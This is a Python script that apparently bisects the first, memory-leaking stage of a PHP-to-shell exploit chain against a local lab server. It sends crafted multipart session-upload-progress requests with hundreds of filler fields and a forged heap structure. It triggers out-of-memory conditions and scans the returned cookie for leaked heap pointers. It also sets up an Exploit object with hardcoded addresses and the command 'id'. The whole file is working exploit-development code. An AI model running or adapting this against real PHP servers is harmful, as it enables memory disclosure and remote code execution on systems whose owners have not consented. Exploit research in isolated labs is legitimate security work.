#!/usr/bin/env python3
"""Bisect alvarodh5's stage-1 mechanism in their lab env (p2s-alv, 16M/32M).
Variants of the _oom + leak-request flow to find what is essential."""
import struct, sys, time

sys.path.insert(0, "/Users/bill/php2shell/alvaro")
from exploit import Target, multipart, parse_cookie, Exploit  # noqa: E402

T = Target("http://localhost:18111/index.php", timeout=60)


def leak_request(with_fillers=True, with_forge=True):
    SID = b"attacksessionid0001"
    parts = [{"name": "PHPSESSID", "data": SID},
             {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
    if with_fillers:
        for i in range(841):
            parts.append({"name": str(1000 + i),
                          "data": (f"v{i:04d}" + "x" * 44)[:48].encode()})
    if with_forge:
        forge = bytearray(b"A" * 79)
        struct.pack_into("<Q", forge, 0x10, 0x1000)
        forge[0x18] = ord("L")
        parts.append({"name": "1999", "data": bytes(forge)})
    raw = parse_cookie(T.post(multipart(parts, b"B" * 10), b"B" * 10, read_cap=9 << 20))
    return raw


def report(tag, raw):
    if not raw:
        print("%-38s -> NO COOKIE (%d bytes resp)" % (tag, -1))
        return
    if len(raw) < 1000:
        print("%-38s -> short cookie (%d): %r" % (tag, len(raw), raw[:40]))
        return
    from collections import Counter
    c = Counter()
    for i in range(len(raw) - 8):
        v = int.from_bytes(raw[i:i + 8], "little")
        if 0x100000000000 <= v < 0x800000000000:
            c[v & ~0x1FFFFF] += 1
    top = [(hex(k), n) for k, n in c.most_common(4)]
    print("%-38s -> LEAK len=%d buckets=%s" % (tag, len(raw), top))


def main():
    ex = Exploit(T, "id", 0x5996e0, 0x7b47a0, 0x7e0d8, 24)
    which = sys.argv[1] if len(sys.argv) > 1 else "all"

    def oom():
        ex._oom(b"x")
        time.sleep(0.3)

    if which in ("all", "A"):
        print("== A: rotate + _oom + full stage-1 (baseline, expect LEAK)")
        ex.rotate(); time.sleep(0.5)
        oom()
        report("A", leak_request(True, True))
    if which in ("all", "B"):
        print("== B: _oom + no fillers")
        ex.rotate()
        oom()
        report("B", leak_request(False, True))
    if which in ("all", "C"):
        print("== C: _oom + fillers, no forge")
        ex.rotate()
        oom()
        report("C", leak_request(True, False))
    if which in ("all", "D"):
        print("== D: NO arm (clean state via plain request) + full stage-1")
        T.post(b"x=1", b"BNDRY12345", read_cap=65536, timeout=20.0)
        time.sleep(0.3)
        report("D", leak_request(True, True))


if __name__ == "__main__":
    main()
